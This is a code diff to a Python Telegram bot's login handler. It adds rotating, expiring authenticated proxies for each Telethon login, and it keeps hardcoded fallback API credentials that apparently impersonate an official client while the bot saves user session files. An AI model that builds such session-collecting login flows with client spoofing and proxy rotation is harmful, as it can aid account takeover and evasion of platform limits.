@@ -3,6 +3,8 @@ import json
 import zipfile
 import asyncio
 import logging
+import random
+import time
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError, AuthRestartError
 from dotenv import load_dotenv
@@ -15,6 +17,80 @@ API_HASH = os.getenv("TELEGRAM_APP_HASH", "b18441a1ff607e10a989891a5462e627")
 
 logger = logging.getLogger(__name__)
 
+_proxy_list = None
+_proxy_list_last_load = 0
+PROXY_LIST_CACHE_TIME = 60
+
+def load_proxies():
+    global _proxy_list, _proxy_list_last_load
+    
+    current_time = time.time()
+    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
+        return _proxy_list
+    
+    proxy_file = "proxy.txt"
+    valid_proxies = []
+    
+    if not os.path.exists(proxy_file):
+        logger.warning("proxy.txt 文件不存在")
+        _proxy_list = []
+        _proxy_list_last_load = current_time
+        return []
+    
+    try:
+        with open(proxy_file, 'r', encoding='utf-8') as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith('#'):
+                    continue
+                
+                parts = line.split(':')
+                if len(parts) >= 5:
+                    ip, port, username, password, expire_ts = parts[:5]
+                    try:
+                        expire_timestamp = int(expire_ts)
+                        if current_time < expire_timestamp:
+                            proxy = {
+                                'ip': ip,
+                                'port': int(port),
+                                'username': username,
+                                'password': password,
+                                'expire': expire_timestamp
+                            }
+                            valid_proxies.append(proxy)
+                        else:
+                            logger.debug(f"代理 {ip}:{port} 已过期")
+                    except ValueError:
+                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
+                        continue
+    
+    except Exception as e:
+        logger.error(f"读取 proxy.txt 失败: {e}")
+        _proxy_list = []
+        _proxy_list_last_load = current_time
+        return []
+    
+    _proxy_list = valid_proxies
+    _proxy_list_last_load = current_time
+    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
+    return valid_proxies
+
+def get_random_proxy():
+    proxies = load_proxies()
+    if not proxies:
+        return None
+    return random.choice(proxies)
+
+def create_proxy_dict(proxy):
+    return {
+        'proxy_type': 'http',
+        'addr': proxy['ip'],
+        'port': proxy['port'],
+        'username': proxy['username'],
+        'password': proxy['password'],
+        'rdns': True
+    }
+
 class LoginHandler:
     def __init__(self, user_id, chat_id):
         self.user_id = user_id
@@ -23,6 +99,7 @@ class LoginHandler:
         self.client = None
         self.session_file = None
         self.twofa = None
+        self.proxy = None
         self._lock = asyncio.Lock()
         self._retry_count = 0
         
@@ -32,10 +109,15 @@ class LoginHandler:
         os.makedirs("sessions", exist_ok=True)
         my_id_val = int(os.getenv("TELEGRAM_API_ID", 2040))
         my_hash_val = str(os.getenv("TELEGRAM_APP_HASH", "b18441a1ff607e10a989891a5462e627")).strip()
+        
+        self.proxy = get_random_proxy()
+        proxy_dict = create_proxy_dict(self.proxy) if self.proxy else None
+        
         self.client = TelegramClient(
             self.session_file, 
             api_id=my_id_val, 
-            api_hash=my_hash_val
+            api_hash=my_hash_val,
+            proxy=proxy_dict
         )
         
         await self.client.connect()
@@ -56,6 +138,8 @@ class LoginHandler:
                 self._retry_count += 1
                 logger.warning(f"AuthRestartError, retrying... ({self._retry_count}/3)")
                 await asyncio.sleep(2)
+                if self.client:
+                    await self.client.disconnect()
                 await self.handle_phone(update, context, phone)
             else:
                 await update.message.reply_text(
